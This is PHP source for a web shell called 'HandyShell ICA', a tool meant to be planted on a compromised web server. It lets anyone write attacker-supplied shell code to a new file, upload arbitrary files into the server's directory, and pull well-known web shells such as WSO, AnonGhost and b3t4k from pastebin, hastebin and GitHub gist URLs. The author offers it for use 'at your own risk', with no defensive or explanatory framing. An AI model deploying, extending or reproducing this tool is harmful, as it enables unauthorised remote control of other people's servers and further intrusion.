<title>HandyShell ICA</title>
<img src="https://1.bp.blogspot.com/-l2aEbrMfVns/V0Qzc6GCqzI/AAAAAAAAB2E/xmVzJ7SDzVYgLh7twkpKsBGd9zz7o3SUwCLcB/s1600/ica.png"><br><br>
<link href="https://fonts.googleapis.com/css?family=Hammersmith+One|Mogra|Orbitron|Play|Shadows+Into+Light" rel="stylesheet">
<style>
body {
    text-align: center;
    background: black;
    color: white;
    font-family: Hammersmith One;
}
input[type="submit"] {
    background: black;
    color: white;
    padding: 7px;
    cursor: pointer;
    outline: none;
    border-radius: 22px;
    border-color: red;
    font-family: Hammersmith One;
}
input[type="submit"]:hover {
    background: #2E2727;
    padding: 7px;
    cursor: pointer;
    color: lime;
    outline: none;
    font-family: Hammersmith One;
}
textarea {
    background: black;
    color: white;
    padding: 7px;
    border-color: red;
    font-family: Hammersmith One;
}
textarea:hover {
    background: #222;
    color: white;
    padding: 7px;
    border-color: red;
    font-family: Hammersmith One;
}
h1 {
    margin: 0;
    margin-top: 0;
    margin-bottom: 0;
    padding: 7px;
    background: #272727;
    color: lime;
    font-family: Orbitron;
}
input[type="text"] {
    background: black;
    color: white;
    padding: 7px;
    border: 1px solid;
    border-color: red;
    outline: none;
    font-family: Hammersmith One;
}
input[type="text"]:hover {
    background: #2E2727;
    padding: 7px;
    color: lime;
    outline: none;
    font-family: Hammersmith One;
}
input[type="file"] {
    background: #111;
}
h4 {
    font-family: Shadows Into Light;
    font-size: 30px;
}
h3 {
    font-family: Mogra;
}
h2 {
    font-family: Orbitron;
}
button {
    background: black;
    color: white;
    padding: 7px;
    cursor: pointer;
    outline: none;
    border-radius: 22px;
    border-color: red;
    font-family: Hammersmith One;
}
button:hover {
    background: #2E2727;
    padding: 7px;
    cursor: pointer;
    color: lime;
    outline: none;
    font-family: Hammersmith One;
}
a {
    text-decoration: none;
    color: white;
}
</style>
 
<?php
 
error_reporting(0);
 
if (isset($_GET['createashell'])) {
    $load = $_GET['createashell'];
    if (isset($load)) {
        if (is_writeable(getcwd()) == 1) {
            echo '<h2>The Current Directory is <font color="lime">writeable</font> .. </h2>';
        } else {
            echo '<h2>The Current Directory is <font color="red">NOT writeable</font> .. </h2>';
        }
       
        echo '<form action="" method="post">File Name:<br><input type="text" name="filename" placeholder="File Name"><br><br>ShellCode:<br><textarea name="content" rows=32 cols=100 placeholder="Input the ShellCode"></textarea><br><br><input type="submit" value="Inject Shell"></form>';
        if (isset($_POST['filename']) && isset($_POST['content'])) {
            $filename    = @$_POST['filename'];
            $filecontent = @$_POST['content'];
            if (!empty($filename) && !empty($filecontent)) {
                if (file_exists($filename)) {
                    echo 'Sorry! The filename already exists<br>';
                } else {
                    $file = fopen($filename, "a");
                    fwrite($file, $filecontent);
                    fclose($file);
                    echo '<a href="' . $filename . '" style="color:lime;">Done!</a><br>';
                }
            } else {
                echo 'Why are you here? It\'s your fault.<br>';
            }
        }
        die();
    }
}
 
?>
 
<form action="" method="post">
    <input type="submit" name="exec" value="System Shell">
    <input type="submit" name="mannushell" value="Mannu Shell ICA">
    <input type="submit" name="wso" value="WSO Shell">
    <input type="submit" name="raz" value="TinyShell">
    <input type="submit" name="webAdmin" value="webAdmin Shell">
    <input type="submit" name="anonGhost" value="AnonGhost Shell">
    <input type="submit" name="dhanush" value="Dhanush Shell">
    <input type="submit" name="dk" value="DK Shell">
    <input type="submit" name="betak" value="b3t4k v 1.0">
    <input type="submit" name="betakv3" value="b3t4k v 3.2.2">
</form>
<button onclick="window.location.search='?createashell';">Create a Shell</button>
<button onclick="window.location.search='?upload';">Upload</button><br><br>
 
<?php
 
if (isset($_POST['exec'])) {
    die("<h1>System Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/wwRaBWEG')) . "</textarea></form>");
}
if (isset($_POST['wso'])) {
    die("<h1>WSO Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/v5QMfGnM')) . "</textarea></form>");
}
if (isset($_POST['raz'])) {
    die("<h1>TinyShell by Raz</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/xbe5zELG')) . "</textarea></form>");
}
if (isset($_POST['webAdmin'])) {
    die("<h1>Web Admin Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/UrQNucNz')) . "</textarea></form>");
}
if (isset($_POST['anonGhost'])) {
    die("<h1>AnonGhost Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('https://gist.githubusercontent.com/rony-das/44693720c45e747d484e9c01e630b97a/raw/6a02a318ab950a3aca021ecdbfa50006ffc4e8ef/anonghost.php')) . "</textarea></form>");
}
if (isset($_POST['dhanush'])) {
    die("<h1>Dhanush Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/3YJkTzgR')) . "</textarea></form>");
}
if (isset($_POST['dk'])) {
    die("<h1>DK Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('https://gist.githubusercontent.com/l33tcodes/cc147d723997eae4375c/raw/354e3673b2c367bd455a27ff31f560a88515e952/DK%2520Shell%2520-%2520WSO%2520PHP%2520Shell%2520with%2520symlink')) . "</textarea></form>");
}
if (isset($_POST['betak'])) {
    die("<h1>Betak v1.0 Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://hastebin.com/raw/efeqetefet')) . "</textarea></form>");
}
if (isset($_POST['betakv3'])) {
    die("<h1>Betak v3.2.2 Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://hastebin.com/raw/ebepiranaw')) . "</textarea></form>");
}
if (isset($_POST['mannushell'])) {
    die("<h1>MannuShell IndiShell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('https://raw.githubusercontent.com/incredibleindishell/Mannu-Shell/master/mannu_pass_protected.php')) . "</textarea></form>");
}
if (isset($_GET['upload'])) {
    echo "<br><br>";
    if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo "Your file is uploaded to the current directory , file named : ";
        echo $_FILES['file']['name'];
    }
    die('<p>Upload a File</p><br> <form action="" method="post" enctype="multipart/form-data">Filename: <input type="file" name="file" /><input type="submit" value="Submit"/>');
}
 
echo "<h1>Welcome Geek!</h1>";
echo "<br><h4>Use this at your own risk , coder is not responisble for what you do with this..</h4>";
echo "<br><h3><font color=\"orange\">Coded</font> by <font color=\"lime\">Rony Das</font></h3>";
?>
